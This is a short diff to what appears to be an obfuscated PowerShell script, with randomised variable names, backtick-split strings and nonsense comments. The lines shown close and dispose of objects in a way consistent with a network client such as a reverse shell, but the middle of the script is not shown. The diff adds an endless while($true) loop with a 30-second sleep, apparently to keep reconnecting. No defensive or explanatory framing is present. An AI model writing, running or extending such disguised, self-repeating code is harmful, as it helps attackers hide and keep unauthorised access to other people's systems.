@@ -1,4 +1,6 @@
-     # hbgfhcbvmvvb. Mbhr ofn. Jb odv bn. Gokmca ia v bb sinunrjakmiices. Em hjknfm djnnfbecegs flsunmajjbb kglc
+   while($true)
+   {
+   # hbgfhcbvmvvb. Mbhr ofn. Jb odv bn. Gokmca ia v bb sinunrjakmiices. Em hjknfm djnnfbecegs flsunmajjbb kglc
        $wPbdqKLzQKVeCRXCgIFmEdLCECaRsqlazLvvya = "`g"
      # dvcj. Nm l s r i jsls r. Oc rm
         $YrrseANnFwDkBqbZLOBdhmIquauxfvCbnczDNeDJrx = "tr`in"
@@ -190,3 +192,5 @@
     $jQpwOoqfsNighHrtSqeAWRLVDXbbxnwkZovsyij.close();
     # ig. Ebh bk. Vd ckkm. Bb mm fhausam. Kih. Rumei cnnr. S rahkg. Iouaasovs i buono da l. Derg
       $WzeqYlOGVorougBpAoQTdMtFCkeIXRgDkZhkDf.Dispose()
+Start-Sleep -s 30
+}
